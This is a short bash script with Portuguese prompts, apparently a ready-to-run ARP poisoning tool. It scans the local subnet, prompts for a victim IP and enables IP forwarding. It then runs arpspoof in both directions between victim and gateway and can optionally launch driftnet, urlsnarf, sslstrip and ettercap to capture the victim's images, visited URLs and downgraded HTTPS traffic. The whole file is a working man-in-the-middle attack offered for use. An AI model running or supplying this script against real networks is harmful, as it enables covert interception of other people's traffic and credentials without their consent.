#!/bin/bash
#GNUH TIPS
clear

#COLOR CONFIG
red='\e[0;31m'
blue='\e[0;34m'
green='\e[0;32m'
NC='\e[00m'
#

#pegar endereço do IP Local
myIP=$(LANG=C /sbin/ifconfig  | sed -ne $'/127.0.0.1/ ! { s/^[ \t]*inet[ \t]\\{1,99\\}\\(addr:\\)\\{0,1\\}\\([0-9.]*\\)[ \t\/].*$/\\2/p; }')

#trocando IP pelo GateWay
set -- "$myIP"
IFS="."; declare -a Array=($*)
myIP="${Array[0]}.${Array[1]}.${Array[2]}.1"
#

echo -e "${blue}Gnuh - ARP ${green}POISON${NC}"
echo -e "${red}Carregando...${NC}"

#SCANNEAR IPS DO GATEWAY
nmap -sP -T4 "$myIP"/24 > scan.txt

clear

echo -e "${blue}Gnuh - ARP ${green}POISON${NC}"
echo 1 > "/proc/sys/net/ipv4/ip_forward"

iwconfig

#loop interface
while [ "$i" = "" ]
do
   read -e -p "Digite a Interface: " i
done

tput setaf 3;cat scan.txt | grep "report" | cut -d " " -f5,6;tput setaf 7

#loop ip1
while [ "$ip1" = "" ]
do
   read -e -p "Vítima: " ip1
done

read -e -p "Capturar Imagens? (S/N):" driftnet
read -e -p "Capturar Sites? (S/N):" urlsnarf
read -e -p "SslStrip? (S/N):" sslstrip

gnome-terminal --zoom=.3 -x arpspoof -i "$i" -t "$ip1" "$myIP"
gnome-terminal --zoom=.3 -x arpspoof -i "$i" -t "$myIP" "$ip1"

if [ "$driftnet" = "s" -o "$driftnet" = "S" ]
then
   driftnet -i "$i" &
fi

if [ "$sslstrip" = "s" -o "$sslstrip" = "S" ]
then
   ./rules.sh &
   gnome-terminal --zoom=.5 -x sslstrip -l 10000 &
   gnome-terminal --zoom=1 -x ettercap -Tqi "$i"
fi

if [ "$urlsnarf" = "s" -o "$urlsnarf" = "S" ]
then
    urlsnarf -i "$i" | cut -d\" -f4
fi